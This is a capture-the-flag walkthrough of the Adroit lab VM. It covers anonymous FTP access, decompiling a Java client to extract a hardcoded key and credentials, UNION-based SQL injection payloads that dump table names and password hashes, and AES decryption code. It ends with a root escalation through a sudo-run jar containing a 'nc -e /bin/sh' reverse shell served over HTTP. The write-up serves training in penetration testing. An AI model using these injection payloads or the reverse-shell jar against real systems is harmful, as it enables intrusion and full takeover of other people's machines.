# Adroit - walkthrough by alienum

## In order to complete the vm you need the following tools
```console
1. sudo apt-get install jd-gui (must)
2. sudo apt-get install openjdk-11-jdk (optionally)
3. eclipse IDE Java Developer (optionally)
```
## port scan
```console
nmap x.x.x.x
21/tcp   open  ftp
22/tcp   open  ssh
3000/tcp open  ppp
3306/tcp open  mysql
```
## ftp 
```console
ftp x.x.x.x
Name: anonymous
ftp> cd pub
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          5451 Jan 14 14:33 adroitclient.jar
-rw-r--r--    1 ftp      ftp           203 Jan 14 16:20 note.txt
-rw-r--r--    1 ftp      ftp         36430 Jan 14 16:15 structure.PNG
ftp> mget *
```
## reading the structure.PNG

We are able to collect important information from the image
the vm running mysql and the database name is adroit

## jd-gui, reading the adroitclient.jar
```console
1. From AdroitClient.class we have got the secret, the credentials and the hostname

1.1. private static final String secret = "Sup3rS3c********";
1.2. socket = new Socket("adroit.local", 3000);
1.3  if (userName.equals(crypt.encrypt("Sup3rS3c********", "z***")) && 
     password.equals(crypt.encrypt("Sup3rS3c********", "god.thunder.*******")))
```

## edit /etc/hosts
```console
<TARGET_IP>   adroit.local
```
## MySQL sql injection
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ java -jar adroitclient.jar                                  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Enter the username : 
zeus
Enter the password : 
god.thunder.olympus
Options [ post | get ] : 
get
Enter the phrase identifier : 
1 or 1=1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='adroit'--

RESULT : haxor ideas users
```
## MySQL sql injection reading columns names from the users table_schema
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ java -jar adroitclient.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Enter the username : 
zeus
Enter the password : 
god.thunder.olympus
Options [ post | get ] : 
get
Enter the phrase identifier : 
1 or 1=1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--

RESULT : haxor id password username CURRENT_CONNECTIONS TOTAL_CONNECTIONS USER
```
## MySQL sql injection reading username and password from table users
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ java -jar adroitclient.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Enter the username : 
zeus
Enter the password : 
god.thunder.olympus
Options [ post | get ] : 
get
Enter the phrase identifier : 
1 or 1=1 UNION ALL SELECT NULL,concat(0x28,username,0x3a,password,0x29) FROM users--

RESULT : haxor (writer:l4A<REDACTED>Kr015+OEC3aOfdrWafSqwpY=)
```
## Decrypting the password
```console
username : writer
encrypted password : l4A<REDACTED>Kr015+OEC3aOfdrWafSqwpY=
```
## Open eclipse
File -> New -> Java Project -> Project name : Decrypt
Expand the Decrypt project file -> Choose the src file + right click -> New -> Class -> Name : Cryptor

Back to jg-gui,  we open again the adroitclient.jar, we copy the whole class Cryptor and we paste it to our Eclipse Cryptor class

## Cryptor.class
```console
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;

public class Cryptor {
	private String secret;

	public String getSecret() {
		return this.secret;
	}

	public void setSecret(String secret) {
		this.secret = secret;
	}

	public String encrypt(String key, String text) throws NoSuchPaddingException, NoSuchAlgorithmException,
			InvalidKeyException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {
		Key aesKey = new SecretKeySpec(key.getBytes(), "AES");
		Cipher cipher = Cipher.getInstance("AES");
		cipher.init(1, aesKey);
		byte[] encrypted = cipher.doFinal(text.getBytes());

		return Base64.getEncoder().encodeToString(encrypted);
	}

	public String decrypt(String key, String text) throws NoSuchPaddingException, NoSuchAlgorithmException,
			InvalidKeyException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {
		try {
			Key aesKey = new SecretKeySpec(key.getBytes(), "AES");
			Cipher cipher = Cipher.getInstance("AES");
			cipher.init(2, aesKey);
			return new String(cipher.doFinal(Base64.getDecoder().decode(text)));

		} catch (InvalidKeyException i) {

			System.out.println("[x] Invalid key length {16 required}");

			return null;
		}
	}
}
```
## Eclipse creating the Main class

Expand the Decrypt project file -> Choose the src file + right click -> New -> Class -> Name : Main, check the checbox to include static main
```console
// Main.class

import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Main {

	public static void main(String[] args) throws InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {
	
		Cryptor cryptor = new Cryptor();
		String password = cryptor.decrypt("Sup3rS3cur3Dr0it", "l4A<REDACTED>Kr015+OEC3aOfdrWafSqwpY=");
		System.out.println(password);

	}

}

Result : Exception in thread "main" javax.crypto.BadPaddingException: Given final block not properly padded. Such issues can arise if a bad key is used during decryption.
```

## Hint tell us : one 0 in not 0 but O

So, the writer he changed one character of the encrypted password to avoid the unwanted decryption
The encrypted password contains two zeros, after changing the substring Kr0 to KrO it returns the password
```console
previous encrypted password : l4A<REDACTED>Kr015+OEC3aOfdrWafSqwpY=
correct  encrypted password : l4A<REDACTED>KrO15+OEC3aOfdrWafSqwpY=
```
### UPDATED Main.class
```console
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Main {

	public static void main(String[] args) throws InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException, UnsupportedEncodingException {
	
		Cryptor cryptor = new Cryptor();
		String password = cryptor.decrypt("Sup3rS3cur3Dr0it", "l4A<REDACTED>KrO15+OEC3aOfdrWafSqwpY=");
		System.out.println(password);

	}

}
###################################
Result : just*********
###################################
```
## SSH Connection, user.txt

username : writer
password : just*********
```console
┌──(alienum㉿kali)-[~]
└─$ ssh writer@10.0.2.142
writer@10.0.2.142's password: just.write.my.ideas

writer@adroit:~$ sudo -l
[sudo] password for writer: just.write.my.ideas
Matching Defaults entries for writer on adroit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User writer may run the following commands on adroit:
    (root) /usr/bin/java -jar /tmp/testingmyapp.jar
writer@adroit:~$ 
```

## Root priv esc

The user writer he is able to run the testingmyapp.jar under the /tmp dir as root
If we check the /tmp dir there is no file named testingmyapp.jar.
So, we are able to create our malware reverse shell testingmyapp.jar

## ECLIPSE Creating our testingmyapp.jar

File -> New -> Java Project -> Project name : testingmyapp
Expand the testingmyapp project file -> Choose the src file + right click -> New -> Class -> Name : Explo


## Explo.class Reverse shell
```console
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Explo {

	public static void main(String[] args) throws IOException {
		
		String cmd = "nc -e /bin/sh <MY_IP> 4444";
		Process p = Runtime.getRuntime().exec(cmd);
		
		BufferedReader pRead = new BufferedReader(new InputStreamReader(p.getInputStream()));

		String line;

		while ((line = pRead.readLine()) != null) {

			System.out.println(line);

		}

	}

}
```
## WAY TO ROOT

### Changing compiler level
First we need to change java compiler version of the testingmyapp project from 14 to 11, because the Adroit vm can execute jar file with 11 version

### Export testingmyapp to testingmyapp.jar
Click on the testingmyapp -> Right click -> Export -> Java -> Runnable JAR file -> Launch configuration -> Explo - testingmyapp -> Finish

## Uploading the testingmyapp.jar to the adroit machine

### My machine
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.0.2.142 - - [16/Jan/2021 01:08:07] "GET /testingmyapp.jar HTTP/1.1" 200 -
```
### Adroit machine
```console
writer@adroit:/tmp$ wget http://10.0.2.15:8001/testingmyapp.jar
--2021-01-15 18:08:08--  http://10.0.2.15:8001/testingmyapp.jar
Connecting to 10.0.2.15:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1191 (1.2K) [application/java-archive]
Saving to: ‘testingmyapp.jar’

testingmyapp.jar                     100%[====================================================================>]   1.16K  --.-KB/s    in 0s      

2021-01-15 18:08:08 (25.0 MB/s) - ‘testingmyapp.jar’ saved [1191/1191]
```
## Final Step

### Adroit machine
```console
writer@adroit:/tmp$ sudo -u root /usr/bin/java -jar /tmp/testingmyapp.jar
```
### My machine 
```console
┌──(alienum㉿kali)-[~/Desktop]
└─$ nc -lvp 4444                                                                                              1 ⚙
listening on [any] 4444 ...
connect to [10.0.2.15] from adroit.local [10.0.2.142] 49644
/usr/bin/script -qc /bin/bash /dev/null
root@adroit:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```
